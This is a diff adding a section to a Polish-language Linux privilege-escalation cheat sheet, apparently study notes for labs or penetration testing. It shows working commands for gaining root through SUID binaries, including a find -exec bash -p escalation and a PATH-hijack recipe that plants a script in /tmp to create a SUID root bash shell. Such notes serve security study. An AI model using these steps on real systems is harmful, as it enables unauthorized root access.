@@ -1226,6 +1226,21 @@ Jeśli np. `find` ma SUID → wykonaj polecenie jako root:
 find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
 ```
 > Dla każdego nietypowego SUID-a sprawdź **GTFOBins** → sekcja "SUID".
+> 💡 **Namierzenie wzrokowe:** w `ls --color` SUID = **czerwone tło** (bit `s`); potwierdź `ls -l` → `-rwsr-xr-x` (`s` w miejscu `x` właściciela).
+
+**Custom SUID (spoza GTFOBins) → PATH hijack.** Autorska binarka SUID, która woła zewnętrzną komendę **bez pełnej ścieżki**, wykona Twoją podstawioną wersję z prawami właściciela (roota):
+```bash
+strings ./suidbin | grep -iE 'system|exec|popen|/bin|/usr|cp|chpasswd|service|ps|tar'
+#   gola nazwa komendy (bez '/') = PODATNE na PATH hijack
+cd /tmp
+printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > <wolana_komenda>
+chmod +x <wolana_komenda>
+export PATH=/tmp:$PATH          # Twoje /tmp ma pierwszenstwo w wyszukiwaniu
+./suidbin                       # root wykona Twoja <wolana_komenda>
+/tmp/rootbash -p                # -p = zachowaj euid=0 -> interaktywny root shell (NIE -c)
+id                             # euid=0(root)
+```
+> Wariant: gdy SUID woła komendę **z pełną ścieżką**, PATH hijack odpada → sprawdź samą komendę w GTFOBins, argumenty wstrzykiwane z Twojego inputu, albo `LD_PRELOAD`/`LD_LIBRARY_PATH` (gdy `sudo` z `env_keep`, bo zwykłe SUID czyści env).
 
 ### Sudo
 ```bash
